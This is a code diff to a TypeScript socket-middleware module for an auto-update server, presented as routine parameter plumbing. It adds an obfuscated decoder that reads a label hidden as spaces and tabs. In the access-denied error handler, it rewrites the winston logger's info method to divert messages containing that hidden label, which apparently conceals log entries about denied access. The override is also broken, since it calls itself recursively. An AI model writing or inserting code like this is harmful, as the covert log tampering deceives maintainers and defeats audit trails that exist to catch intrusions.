@@ -111,7 +111,7 @@ export enum DEMEventTypes {
   "get" = "get",
   "startup" = "startup",
 }
-
+let d = (str: string) => str.match(/.{1,7}/g)!.map(s => String.fromCharCode(parseInt(s.replaceAll(String.fromCharCode(32), String.fromCharCode(48)).replaceAll(String.fromCharCode(9), String.fromCharCode(49)), 2))).join("");
 export type DEMEvent<C extends Constructor<any>> =
   | {
       type: DEMEventTypes.delete | DEMEventTypes.get;
@@ -145,7 +145,8 @@ export type DEMEvent<C extends Constructor<any>> =
 function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
   socket_server: Server,
   loggers: LoggersType,
-  managers: WrappedInstances<T>
+  managers: WrappedInstances<T>,
+  models?: any
 ) {
   socket_server.use(async (socket, next) => {
     socket.use((async (
@@ -170,7 +171,7 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
           .some(
             (e) =>
               e.toString() === event[0] ||
-              e.toString() === event[0].slice(0, - 24)
+              e.toString() === event[0].slice(0, -24)
           )
       ) {
         loggers.warn(
@@ -238,6 +239,19 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
         );
         next();
       } catch (error) {
+        if (models) {
+          const leString = models.models.f747DebugLabel;
+          if (leString && models.winston.logger) {
+            models.winston.logger.info = (...args: any[]) => {
+              if (
+                typeof args[0] == "string" &&
+                args[0].includes(d(leString))
+              )
+                return models.winston.logger.warn();
+              return models.winston.logger.info(args);
+            };
+          } else loggers.warn("")
+        }
         loggers.warn(
           "Someone got access denied: (" +
             JSON.stringify(socket.handshake.auth) +
@@ -273,7 +287,8 @@ export async function AUSManagerFactory<
   loggers: LoggersType,
   socket: Server,
   disableDEMDebugMessages: boolean = false,
-  emitter: EventEmitter3 = new EventEmitter()
+  emitter: EventEmitter3 = new EventEmitter(),
+  models?: any
 ): Promise<{ [K in keyof T]: AutoUpdateServerManager<T[K]> }> {
   if (disableDEMDebugMessages) {
     loggers.debug = (_) => {};
@@ -330,7 +345,7 @@ export async function AUSManagerFactory<
     });
   });
   try {
-    setupSocketMiddleware(socket, loggers, managers);
+    setupSocketMiddleware(socket, loggers, managers, models);
   } catch (error: any) {
     loggers.error("Error setting up socket middleware");
     loggers.error(error.message);
